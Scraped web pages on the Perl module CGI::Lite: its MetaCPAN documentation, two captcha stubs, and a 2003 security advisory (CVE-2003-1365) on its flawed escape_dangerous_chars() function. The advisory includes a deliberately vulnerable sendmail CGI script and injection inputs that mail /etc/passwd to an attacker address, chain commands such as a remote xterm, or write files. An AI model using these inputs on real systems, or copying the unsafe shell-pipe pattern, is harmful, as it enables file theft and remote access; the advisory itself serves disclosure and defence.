=== Content from cxsecurity.com_717c3e9d_20250126_113059.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from search.cpan.org_223cf13e_20250125_195152.html ===


* [About](/about)
* [Sponsor](/about/sponsors)
* [grep::cpan](https://grep.metacpan.org/)
* [Recent](/recent)
* [FAQ](/about/faq)
* [Tools](/tools)
* [API](https://fastapi.metacpan.org/)

* + [Identities](/account/identities)
  + [Profile](/account/profile)
  + [Favorites](/account/favorite/list)
  + Logout
* + [GitHub](/login/github)
  + [Twitter](/login/twitter)
  + [Google](/login/google)

* 19 Aug 2003 19:01:31 UTC
* Distribution: [CGI-Lite](/release/SMYLERS/CGI-Lite-2.02)
* Module version: 2.02
* [Source](/release/SMYLERS/CGI-Lite-2.02/source/Lite.pm)
  ([raw](/release/SMYLERS/CGI-Lite-2.02/source/Lite.pm?raw=1))
* [Browse](/release/SMYLERS/CGI-Lite-2.02/source)
  ([raw](/release/SMYLERS/CGI-Lite-2.02/source?raw=1))
* [Changes](/release/SMYLERS/CGI-Lite-2.02/changes)
* [How to Contribute](/release/SMYLERS/CGI-Lite-2.02/contribute)
* [Issues](https://rt.cpan.org/Public/Dist/Display.html?Name=CGI-Lite)
  (0)
* [Testers](http://matrix.cpantesters.org/?dist=CGI-Lite+2.02 "Matrix")
  ([432](https://www.cpantesters.org/distro/C/CGI-Lite.html?oncpan=1&distmat=1&version=2.02&grade=2) / [0](https://www.cpantesters.org/distro/C/CGI-Lite.html?oncpan=1&distmat=1&version=2.02&grade=3) / [0](https://www.cpantesters.org/distro/C/CGI-Lite.html?oncpan=1&distmat=1&version=2.02&grade=4))
* [Kwalitee](http://cpants.cpanauthors.org/release/SMYLERS/CGI-Lite-2.02)
* Bus factor: 1
* License: unknown
* Activity
* ![](/dist/CGI-Lite/activity.svg?res=month)
  24 month
* Tools
* [Download (15.36KB)](https://cpan.metacpan.org/authors/id/S/SM/SMYLERS/CGI-Lite-2.02.tar.gz)
* [MetaCPAN Explorer](https://explorer.metacpan.org/?url=%2Fmodule%2FSMYLERS%2FCGI-Lite-2.02%2FLite.pm)
* [Permissions](/dist/CGI-Lite/permissions)
* [Subscribe to distribution](/dist/CGI-Lite/releases.rss)
* Install Instructions
* Jump to version
  3.03
  (HOUSTON on 2021-05-06)
  3.02
  (HOUSTON on 2018-05-19)
  3.00\_02 DEV
  (HOUSTON on 2015-11-27)
  3.00\_01 DEV
  (HOUSTON on 2015-10-15)
  2.05
  (HOUSTON on 2014-10-23)
  2.04
  (HOUSTON on 2014-07-04)
  2.03
  (HOUSTON on 2014-05-26)
  2.02
  (SMYLERS on 2003-08-19)
  '
  3.02\_02 DEV
  (HOUSTON on 2021-03-31)
  3.02\_01 DEV
  (HOUSTON on 2021-03-16)
  3.01\_02 DEV
  (HOUSTON on 2018-05-08)
  3.01\_01 DEV
  (HOUSTON on 2018-05-04)
  3.01
  (HOUSTON on 2015-12-10)
  3.00
  (HOUSTON on 2015-05-21)
  2.99\_04 DEV
  (HOUSTON on 2015-05-18)
  2.99\_03 DEV
  (HOUSTON on 2015-04-05)
  2.99\_02 DEV
  (HOUSTON on 2015-04-04)
  2.99\_01 DEV
  (HOUSTON on 2015-03-31)
  2.04\_05 DEV
  (HOUSTON on 2014-10-11)
  2.04\_04 DEV
  (HOUSTON on 2014-10-08)
  2.04\_02 DEV
  (HOUSTON on 2014-10-07)
  2.04\_01 DEV
  (HOUSTON on 2014-10-06)
  2.03\_02 DEV
  (HOUSTON on 2014-06-17)
  2.03\_01 DEV
  (HOUSTON on 2014-06-13)
  2.001-emergencyrelease
  (ANDK on 2003-02-17)
  2.0
  (BENL on 2000-08-20)
* Diff with version
  3.03
  (HOUSTON on 2021-05-06)
  3.02
  (HOUSTON on 2018-05-19)
  3.00\_02 DEV
  (HOUSTON on 2015-11-27)
  3.00\_01 DEV
  (HOUSTON on 2015-10-15)
  2.05
  (HOUSTON on 2014-10-23)
  2.04
  (HOUSTON on 2014-07-04)
  2.03
  (HOUSTON on 2014-05-26)
  2.02
  (SMYLERS on 2003-08-19)
  '
  3.02\_02 DEV
  (HOUSTON on 2021-03-31)
  3.02\_01 DEV
  (HOUSTON on 2021-03-16)
  3.01\_02 DEV
  (HOUSTON on 2018-05-08)
  3.01\_01 DEV
  (HOUSTON on 2018-05-04)
  3.01
  (HOUSTON on 2015-12-10)
  3.00
  (HOUSTON on 2015-05-21)
  2.99\_04 DEV
  (HOUSTON on 2015-05-18)
  2.99\_03 DEV
  (HOUSTON on 2015-04-05)
  2.99\_02 DEV
  (HOUSTON on 2015-04-04)
  2.99\_01 DEV
  (HOUSTON on 2015-03-31)
  2.04\_05 DEV
  (HOUSTON on 2014-10-11)
  2.04\_04 DEV
  (HOUSTON on 2014-10-08)
  2.04\_02 DEV
  (HOUSTON on 2014-10-07)
  2.04\_01 DEV
  (HOUSTON on 2014-10-06)
  2.03\_02 DEV
  (HOUSTON on 2014-06-17)
  2.03\_01 DEV
  (HOUSTON on 2014-06-13)
  2.001-emergencyrelease
  (ANDK on 2003-02-17)
  2.0
  (BENL on 2000-08-20)
* + Dependencies
  + *unknown*
  + ---
  + [Reverse dependencies](/module/CGI%3A%3ALite/requires)
  + [CPAN Testers List](http://deps.cpantesters.org/?module=CGI%3A%3ALite)
  + [Dependency graph](https://cpandeps.grinnz.com/?dist=CGI-Lite&dist_version=2.02)
* Permalinks
* [This version](/release/SMYLERS/CGI-Lite-2.02/view/Lite.pm)
* [Latest version](/pod/CGI%3A%3ALite)

[Smylers](/author/SMYLERS)

 /

3.03
(HOUSTON on 2021-05-06)
3.02
(HOUSTON on 2018-05-19)
3.00\_02 DEV
(HOUSTON on 2015-11-27)
3.00\_01 DEV
(HOUSTON on 2015-10-15)
2.05
(HOUSTON on 2014-10-23)
2.04
(HOUSTON on 2014-07-04)
2.03
(HOUSTON on 2014-05-26)
2.02
(SMYLERS on 2003-08-19)
'
3.02\_02 DEV
(HOUSTON on 2021-03-31)
3.02\_01 DEV
(HOUSTON on 2021-03-16)
3.01\_02 DEV
(HOUSTON on 2018-05-08)
3.01\_01 DEV
(HOUSTON on 2018-05-04)
3.01
(HOUSTON on 2015-12-10)
3.00
(HOUSTON on 2015-05-21)
2.99\_04 DEV
(HOUSTON on 2015-05-18)
2.99\_03 DEV
(HOUSTON on 2015-04-05)
2.99\_02 DEV
(HOUSTON on 2015-04-04)
2.99\_01 DEV
(HOUSTON on 2015-03-31)
2.04\_05 DEV
(HOUSTON on 2014-10-11)
2.04\_04 DEV
(HOUSTON on 2014-10-08)
2.04\_02 DEV
(HOUSTON on 2014-10-07)
2.04\_01 DEV
(HOUSTON on 2014-10-06)
2.03\_02 DEV
(HOUSTON on 2014-06-17)
2.03\_01 DEV
(HOUSTON on 2014-06-13)
2.001-emergencyrelease
(ANDK on 2003-02-17)
2.0
(BENL on 2000-08-20)

[CGI-Lite-2.02](/release/SMYLERS/CGI-Lite-2.02)

 River stage one
• 1 direct dependent
• 1 total dependent

 ++

 ++

/ CGI::Lite

**Contents**

* [NAME](#NAME)
* [SYNOPSIS](#SYNOPSIS)
* [DESCRIPTION](#DESCRIPTION)
* [METHODS](#METHODS)
* [SEE ALSO](#SEE-ALSO)
* [MAINTAINER](#MAINTAINER)
* [ACKNOWLEDGMENTS](#ACKNOWLEDGMENTS)
* [COPYRIGHT INFORMATION](#COPYRIGHT-INFORMATION)

# NAME

CGI::Lite - Process and decode WWW forms and cookies

# SYNOPSIS

```
use CGI::Lite;

$cgi = new CGI::Lite;

$cgi->set_platform ($platform);

    where $platform can be one of (case insensitive):
    Unix, Windows, Windows95, DOS, NT, PC, Mac or Macintosh

$cgi->set_file_type ('handle' or 'file');
$cgi->add_timestamp (0, 1 or 2);

    where 0 = no timestamp
          1 = timestamp all files (default)
          2 = timestamp only if file exists

$cgi->filter_filename (\&subroutine);

$size = $cgi->set_buffer_size ($some_buffer_size);

$status = $cgi->set_directory ('/some/dir');
$cgi->set_directory ('/some/dir') || die "Directory doesn't exist.\n";

$cgi->close_all_files;

$cgi->add_mime_type ('application/mac-binhex40');
$status = $cgi->remove_mime_type ('application/mac-binhex40');
@list = $cgi->get_mime_types;

$form = $cgi->parse_form_data;
%form = $cgi->parse_form_data;

or

$form = $cgi->parse_form_data ('GET', 'HEAD' or 'POST');

$cookies = $cgi->parse_cookies;
%cookies = $cgi->parse_cookies;

$status  = $cgi->is_error;
$message = $cgi->get_error_message;

$cgi->return_error ('error 1', 'error 2', ...);

$keys = $cgi->get_ordered_keys;
@keys = $cgi->get_ordered_keys;

$cgi->print_data;

$cgi->print_form_data;   (deprecated as of v1.8)
$cgi->print_cookie_data; (deprecated as of v1.8)

$new_string = $cgi->wrap_textarea ($string, $length);

@all_values = $cgi->get_multiple_values ($reference);

$cgi->create_variables (\%form);
$cgi->create_variables ($form);

$escaped_string = browser_escape ($string);

$encoded_string = url_encode ($string);
$decoded_string = url_decode ($string);

$status = is_dangerous ($string);
$safe_string = escape_dangerous_chars ($string); # ***use is discouraged***
```
# DESCRIPTION

You can use this module to decode form and query information, including file uploads, as well as cookies in a very simple manner; you need not concern yourself with the actual details behind the decoding process.

# METHODS

Here are the methods you can use to process your forms and cookies:

**parse\_form\_data**

This will handle the following types of requests: GET, HEAD and POST. By default, CGI::Lite uses the environment variable REQUEST\_METHOD to determine the manner in which the query/form information should be decoded. However, as of v1.8, you are allowed to pass a valid request method to this function to force CGI::Lite to decode the information in a specific manner.

For multipart/form-data, uploaded files are stored in the user selected directory (see **set\_directory**). If timestamp mode is on (see **add\_timestamp**), the files are named in the following format:

```
timestamp__filename
```

where the filename is specified in the "Content-disposition" header. *NOTE:*, the browser URL encodes the name of the file. This module makes *no* effort to decode the information for security reasons. However, you can do so by creating a subroutine and then using the **filter\_filename** method.

*Return Value*

Returns either a hash or a reference to the hash, which contains all of the key/value pairs. For fields that contain file information, the value contains either the path to the file, or the filehandle (see the **set\_file\_type** method).

**parse\_new\_form\_data**

As for parse\_form\_data, but clears the CGI object state before processing the request. This is useful in persistant application (e.g. FCGI), where the CGI object is reused for multiple requests. e.g.

```
$CGI = new CGI::Lite;
while (FCGI::accept > 0)
{
	$Query = $CGI->parse_new_form_data();
	<process query>
}
```

**parse\_cookies**

Decodes and parses cookies passed by the browser. This method works in much the same manner as **parse\_form\_data**.

**is\_error**

As of v1.8, errors in parsing are handled differently. You can use this method to check for any potential errors after you've called either **parse\_form\_data** or **parse\_cookies**.

*Return Value*

```
0 Success
1 Failure
```

**get\_error\_message**

If an error occurs when parsing form/query information or cookies, you can use this method to retrieve the error message. Remember, you can check for errors by calling the **is\_error** method.

*Return Value*

The error message.

**return\_error**

You can use this method to return errors to the browser and exit.

**set\_platform**

You can use this method to set the platform on which your Web server is running. CGI::Lite uses this information to translate end-of-line (EOL) characters for uploaded files (see the **add\_mime\_type** and **remove\_mime\_type** methods) so that they display properly on that platform.

You can specify either (case insensitive):

```
Unix                                  EOL: \012      = \n
Windows, Windows95, DOS, NT, PC       EOL: \015\012  = \r\n
Mac or Macintosh                      EOL: \015      = \r
```

"Unix" is the default.

**set\_directory**

Used to set the directory where the uploaded files will be stored (only applies to the *multipart/form-data* encoding scheme).

This function should be called *before* you call **parse\_form\_data**, or else the directory defaults to "/tmp". If the application cannot write to the directory for whatever reason, an error status is returned.

*Return Value*

```
0  Failure
1  Success
```

**close\_all\_files**

All uploaded files that are opened as a result of calling **set\_file\_type** with the "handle" argument can be closed in one shot by calling this method.

**add\_mime\_type**

By default, EOL characters are translated for all uploaded files with specific MIME types (i.e text/plain, text/html, etc.). You can use this method to add to the list of MIME types. For example, if you want CGI::Lite to translate EOL characters for uploaded files of *application/mac-binhex40*, then you would do this:

```
$cgi->add_mime_type ('application/mac-binhex40');
```

**remove\_mime\_type**

This method is the converse of **add\_mime\_type**. It allows you to remove a particular MIME type. For example, if you do not want CGI::Lite to translate EOL characters for uploaded files of *text/html*, then you would do this:

```
$cgi->remove_mime_type ('text/html');
```

*Return Value*

```
0  Failure
1  Success
```

**get\_mime\_types**

Returns the list, either as a reference or an actual list, of the MIME types for which EOL translation is performed.

**set\_file\_type**

The *names* of uploaded files are returned by default, when you call the **parse\_form\_data** method. But, if pass the string "handle" to this method, the *handles* to the files are returned. However, the name of the handle corresponds to the filename.

This function should be called *before* you call **parse\_form\_data**, or else it will not work.

**add\_timestamp**

By default, a timestamp is added to the front of uploaded files. However, you have the option of completely turning off timestamp mode (value 0), or adding a timestamp only for existing files (value 2).

**filter\_filename**

You can use this method to change the manner in which uploaded files are named. For example, if you want uploaded filenames to be all upper case, you can use the following code:

```
$cgi->filter_filename (\&make_uppercase);
$cgi->parse_form_data;

.
.
.

sub make_uppercase
{
    my $file = shift;

    $file =~ tr/a-z/A-Z/;
    return $file;
}
```

**set\_buffer\_size**

This method allows you to set the buffer size when dealing with multipart form data. However, the *actual* buffer size that the algorithm uses *can* be up to 3x the value you specify. This ensures that boundary strings are not "split" between multiple reads. So, take this into consideration when setting the buffer size.

You cannot set a buffer size below 256 bytes and above the total amount of multipart form data. The default value is 1024 bytes.

*Return Value*

The buffer size.

**get\_ordered\_keys**

Returns either a reference to an array or an array itself consisting of the form fields/cookies in the order they were parsed.

*Return Value*

Ordered keys.

**print\_data**

Displays all the key/value pairs (either form data or cookie information) in a ordered fashion. The methods **print\_form\_data** and **print\_cookie\_data** are deprecated as of version v1.8, and will be removed in future versions.

**print\_form\_data**

Deprecated as of v1.8, see **print\_data**.

**print\_cookie\_data** (deprecated as of v1.8)

Deprecated as of v1.8, see **print\_data**.

**wrap\_textarea**

You can use this function to "wrap" a long string into one that is separated by a combination of carriage return and newline (see **set\_platform**) at fixed lengths. The two arguments that you need to pass to this method are the string and the length at which you want the line separator added.

*Return Value*

The modified string.

**get\_multiple\_values**

One of the major changes to this module as of v1.7 is that multiple values for a single key are returned as an reference to an array, and *not* as a string delimited by the null character ("\0"). You can use this function to return the actual array. And if you pass a scalar value to this method, it will simply return that value.

There was no way I could make this backward compatible with versions older than 1.7. I apologize!

*Return Value*

Array consisting of the multiple values.

**create\_variables**

Sometimes, it is convenient to have scalar variables that represent the various keys in a hash. You can use this method to do just that. Say you have a hash like the following:

```
    %form = ('name'   => 'shishir gundavaram',
	     'sport'  => 'track and field',
	     'events' => '100m');
```

If you call this method in the following manner:

```
$cgi->create_variables (\%hash);
```

it will create three scalar variables: $name, $sport and $events. Convenient, huh?

**browser\_escape**

Certain characters have special significance to the browser. These characters include: "<" and ">". If you want to display these "special" characters, you need to escape them using the following notation:

```
&#ascii;
```

This method does just that.

*Return Value*

Escaped string.

**url\_encode**

This method will URL encode a string that you pass it. You can use this to encode any data that you wish to pass as a query string to a CGI application.

*Return Value*

URL encoded string.

**url\_decode**

You can use this method to URL decode a string.

*Return Value*

URL decoded string.

**is\_dangerous**

This method checks for the existence of dangerous meta-characters.

*Return Value*

```
0 Safe
1 Dangerous
```

**escape\_dangerous\_chars**

You can use this method to "escape" any dangerous meta-characters. The use of this function is strongly discouraged. See http://use.perl.org/~cbrooks/journal/10542 and http://msgs.securepoint.com/cgi-bin/get/bugtraq0302/94.html for an advisory by Ronald F. Guilmette. Ronald's patch to make this function more safe is applied, but as has been pointed out on the bugtraq mailing list, it is still much better to run no external shell at all when executing commands. Please read the advisory and the WWW security FAQ.

*Return Value*

Escaped string.

# SEE ALSO

If you're looking for more comprehensive CGI modules, you can either use the CGI::\* modules or CGI.pm. Both are maintained by Dr. Lincoln Stein *(lstein@genome.wi.mit.edu)* and can be found at your local CPAN mirror and at his Web site:

*http://www-genome.wi.mit.edu/WWW/tools/scripting*

# MAINTAINER

Maintenance of this module has now been taken over by Smylers <smylers@cpan.org>.

# ACKNOWLEDGMENTS

The author thanks the following for finding bugs and offering suggestions:

Eric D. Friedman (friedman@uci.edu)

Thomas Winzig (tsw@pvo.com)

Len Charest (len@cogent.net)

Achim Bohnet (ach@rosat.mpe-garching.mpg.de)

John E. Townsend (John.E.Townsend@BST.BLS.com)

Andrew McRae (mcrae@internet.com)

Dennis Grant (dg50@chrysler.com)

Scott Neufeld (scott.neufeld@mis.ussurg.com)

Raul Almquist (imrs@ShadowMAC.org)

and many others!

# COPYRIGHT INFORMATION

```
    Copyright (c) 1995, 1996, 1997 by Shishir Gundavaram
                    All Rights Reserved

Permission to use, copy, and  distribute  is  hereby granted,
providing that the above copyright notice and this permission
appear in all copies and in supporting documentation.
```

×
#### Module Install Instructions

To install CGI::Lite, copy and paste the appropriate command in to your terminal.

[cpanm](/dist/App-cpanminus/view/bin/cpanm)

```
cpanm CGI::Lite
```

[CPAN shell](/pod/CPAN)

```
perl -MCPAN -e shell
install CGI::Lite
```

For more information on module installation, please visit [the detailed CPAN module installation guide](https://www.cpan.org/modules/INSTALL.html).

Close

[![MetaCPAN](/static/images/metacpan-logo.svg)](/)

[About](/about)

[Sponsor](/about/sponsors)

[grep::cpan](https://grep.metacpan.org)

[Recent](/recent)

[FAQ](/about/faq)

[Tools](/tools)

[API](https://fastapi.metacpan.org/)

[Perl.org](https://www.perl.org/)

[![Bytemark logo](/static/images/sponsors/bytemark_logo.svg)](https://www.bytemark.co.uk/)
[![liquidweb logo](/static/images/sponsors/liquidweb_logo.png)](https://www.liquidweb.com/)
[![Deriv logo](/static/images/sponsors/deriv.svg)](https://deriv.com/careers/)
[![Geocode logo](/static/images/sponsors/geocodelogo.svg)](https://geocode.xyz)
[![Fastly logo](/static/images/sponsors/fastly_logo.svg)](https://www.fastly.com/)
[![OpenCage logo](/static/images/sponsors/open-cage.svg)](https://opencagedata.com)

[![Elastic logo](/static/images/sponsors/elastic.svg)](https://www.elastic.co/)

[![Route4Me logo](/static/images/sponsors/route4me.png)](https://route4me.com/)

×
#### Keyboard Shortcuts

|  | Global |
| --- | --- |
| `s` | Focus search bar |
| `?` | Bring up this help dialog |

|  | GitHub |
| --- | --- |
| `g` `p` | Go to pull requests |
| `g` `i` | go to github issues (only if github is preferred repository) |

|  | POD |
| --- | --- |
| `g` `a` | Go to author |
| `g` `c` | Go to changes |
| `g` `i` | Go to issues |
| `g` `d` | Go to dist |
| `g` `r` | Go to repository/SCM |
| `g` `s` | Go to source |
| `g` `b` | Go to file browse |

|  | Search terms |
| --- | --- |
| *module:* (e.g. [module:Plugin](/search?q=module%3APlugin)) |
| *distribution:* (e.g. [distribution:Dancer auth](/search?q=distribution%3ADancer+auth)) |
| *author:* (e.g. [author:SONGMU Redis](/search?q=author%3ASONGMU+Redis)) |
| *version:* (e.g. [version:1.00](/search?q=version%3A1.00)) |



=== Content from securityreason.com_e102aaef_20250125_195159.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Security bug in CGI::Lite::escape\_dangerous\_chars() function** **2007.10.17** Credit:  **[Ronald F. Guilmette](https://cxsecurity.com/author/Ronald%2BF.%2BGuilmette/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2003-1365](https://cxsecurity.com/cveshow/CVE-2003-1365/ "Click to see CVE-2003-1365")** CWE: **N/A** CVSS Base Score: **5/10** Impact Subscore: **2.9/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **None** Integrity impact: **Partial** Availability impact: **None** | | --- | |
| --- | --- | --- | --- |

SUBJECT
Security bug in CGI::Lite::escape\_dangerous\_chars() function, part
of the CGI::Lite 2.0 package, and earlier revisions thereof.
SUMMARY
The CGI::Lite::escape\_dangerous\_chars() function fails to escape
the entire set of special characters that may have significance
to the underlying shell command processor. When the function is
used from within a web CGI script which processes arbitrary user
input from some HTML form, an attacker may be able to read and/or
write some or all local files and may be able to obtain shell-
level access to the attacked web server.
SCOPE
Any and all UNIX and/or Linux systems which incorporate the Perl
CGI::Lite module, or onto which this module has been installed.
It appears likely that any/all MS Windows systems onto which the
Perl CGI::Lite module has been installed may also be affected,
however the author of this advisory HAS NOT verified that.
IMPACT
If the CGI::Lite::escape\_dangerous\_chars() function is used within
(for example) a web CGI script, a remote attacker may be able to
read and/or write local files on the attacked web server and/or
may be able to gain shell-level access to the attacked web server,
via the CGI script, as the user-id under which the CGI script is
executed (typically, but not always the `nobody' user).
The potential exists for remote root compromise (or other privileged
access) if a CGI script using CGI::Lite::escape\_dangerous\_chars() is
installed as set-uid (root) or set-gid.
DISCUSSION
Although poorly documented, the CGI::Lite::escape\_dangerous\_chars()
function appears to be a function whose purpose is to modify an
input character string in a way so that ``dangerous'' characters
which might otherwise have special significance to an underlying
shell command processor will each be preceded by a backslash
(escape) character in the resulting output string. The intent is
clearly to convert possibly dangerous user input strings into
benign forms that, when provided as command line arguments to an
underlying shell command processor, will not have any undesirable
and/or unanticipated effects. (The classical example is the semi-
colon character, which acts as a command separator for most UNIX
and/or Linux shell command processors.)
It is reasonable to believe that CGI::Lite::escape\_dangerous\_chars()
has, in all probability, been used for exactly this purpose (i.e.
rendering user input strings ``harmless'' in advance of their being
provided, as arguments, to an underlying shell processor) in many
existing Perl CGI scripts.
Unfortunately, CGI::Lite::escape\_dangerous\_chars() fails to escape
many of the characters mentioned as possibly dangerous characters
in the WWW security FAQ (Question 7), specifically:
\ - backslash
? - question mark
~ - tilde
^ - carat
\n - newline
\r - carriage return
Note that all or most of these character \_do\_ in fact have special
meaning, when presented as parts of command line arguments to
various UNIX and/or Linux shell command processors (and, I suspect,
probably MS Windows shell command line processors also).
Below is a trivially simple example of how this security flaw can
cause a problem, in practice:
=====================================================================
#!/usr/bin/perl -w
use strict;
use CGI::Lite;
my $cgi = new CGI::Lite;
my %form = $cgi->parse\_form\_data;
my $recipient = $form{'recipient'};
my $message = "From: sender\nSubject: Hello\n\nHello my friend!\n\n";
$recipient = escape\_dangerous\_chars ($recipient);
open (SM, "|/usr/sbin/sendmail -f rfg $recipient");
print SM $message;
close SM;
print "Content-Type: text/html\n\n";
print "<HTML>\n";
print "<HEAD></HEAD>\n";
print "<BODY>\n";
print "Thank you. Your request has been processed\n";
print "</BODY>\n";
print "</HTML>\n";
=====================================================================
The Perl CGI script above might be constructed to act as the back-end
(CGI) handler for a simple web page that allows a web visitor to enter
his/her e-mail address into a text field on the form, and thereby
trigger the automated sending of some pre-canned (or dynamically
computed) e-mail message to the user-supplied e-mail address.
Note that the escape\_dangerous\_chars function is used to ``sanitize''
the user-supplied input string before it is used as an argument to
the Perl open function.
Unfortunately, the fact that escape\_dangerous\_chars fails to properly
backslash-escape any backslash characters contained in its input string
has very serious security consequences for the simple CGI script shown
above. Consider what would happen if a web visitor entered the string:
attacker (at) example (dot) com [email concealed] \</etc/passwd
Note that after escape\_dangerous\_chars is applied to this user input,
the resulting string will be
attacker (at) example (dot) com [email concealed] \\</etc/passwd
and that exact string will be passed to the underlying shell command
processor via the Perl open call.
The unfortunate result of this sequence of events would be that a
copy of the local password file would be e-mailed, both to
<attacker (at) example (dot) com [email concealed]> and also to the (almost certainly non-existent)
local user whose user-id is a single backslash character. (Most
UNIX/Linux shells will see the \\ as a single backslash-escaped
backslash character. That single backslash character will then
be treated as being just another member of the list of destination
e-mail addresses for the outgoing e-mail message by sendmail.)
In this example, the account, if any, to which e-mail addresses to the
(non-existent?) local user-id '\' is directed will vary, depending
upon whether one is using ``real'' Sendmail or, as I do, a mostly
compatible Sendmail clone (Postfix). It may also depend, of course,
on how exactly the local mail server has been configured. E-mail
sent to the local user '\' may in some cases be automatically re-
directed to the `nobody' account, which is to say to /dev/null, in
which case no local user or administrator would have any idea that
anything untoward or undesirable had even taken place.
Regardless of where the \_second\_ copy of the e-mail message goes
however, the damage has already been done... <attacker (at) example (dot) com [email concealed]>
\_will\_ be e-mailed a copy of the local password file... or any other
attacker-selected file residing on the exploited system.
Other similar (but perhaps even more damaging) kinds of exploits are
also possible, for example:
attacker (at) example (dot) com [email concealed]\|other-command
or perhaps:
attacker (at) example (dot) com [email concealed]\;other-command
where `other-command' is `xterm' followed by a set of arguments needed
to start up a remotely-accessible xterm window. Also, depending on
permissions, local files on the exploited machine could be created or
overwritten, e.g. via:
attacker (at) example (dot) com [email concealed]\>/tmp/new-file
attacker (at) example (dot) com [email concealed]\>/tmp/unprotected-file
CONCLUSION
It is clear that CGI::Lite::escape\_dangerous\_chars fails to properly
backslash-escape backslash characters themselves, and other characters
that may have special significance to the underlying shell command
processor, when such characters are present in the input string.
It is also clear that this failure can lead, and probably already
has led, in many cases, to trivially-exploitable CGI scripts via
which remote attackers can read files, write files, create files,
and probably even obtain a remote shell access on the exploited
target system(s).
Note that that even if a CGI script using escape\_dangerous\_chars goes
to the additional trouble of deleting all whitespace characters from
user-supplied HTML form text field values (e.g. via s/\s//g) in ad-
dition to applying escape\_dangerous\_chars to sanitize the input, the
elimination of whitespace characters is quite definitely NOT sufficient
to prevent all possible exploits, as illustrated in the examples above.
FIX
One possible fix for this problem is simple and obvious. The
escape\_dangerous\_chars could be hacked to include, in the set of
characters that it will escape, the backslash character and other
special characters from the complete set of ``dangerous'' characters
as documented in the WWW Security FAQ. (A patch which effects this
change is available from the author of this advisory upon request.)
The advisability of this specific ``quick and dirty'' fix has been
questioned by multiple parties however. (Some say that it would
better to list the set of characters which are safe to NOT escape,
and then just have the function escape every character that is NOT
in that ``safe'' character set.)
ADVISORY AUTHOR
Ronald F. Guilmette <rfg (at) monkeys (dot) com [email concealed]>
ADVISIORY DATE
February 11, 2003
DISCLOSURE HISTORY
Multiple attempts were made to advise both the current maintainer of
the CGI::Lite module (b.d.low (at) ieee (dot) org [email concealed]) and also the administrator
of the CPAN Perl archive web site (cpan (at) perl (dot) org [email concealed]) beginning on
January 10th, 2003, regarding this security bug/issue. To the
present date, no response of any kind was received from ether party.
CERT (cerg.org) was advised of the details of this security issue
on January 22nd, 2003, and responded that they would notify and
canvas their affiliated software vendors on this issue. As of
this writing, CERT has not provided any indication that any of
their affiliated software vendors are affected by this issue.
<security (at) redhat (dot) com [email concealed]> was also notified in January 22nd, 2003.
A representative of RedHat responded that RedHat is not affected
by this security issue, but promised to notify other relevant
software vendors of this issue.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007100058)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_286a5897_20250126_113100.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


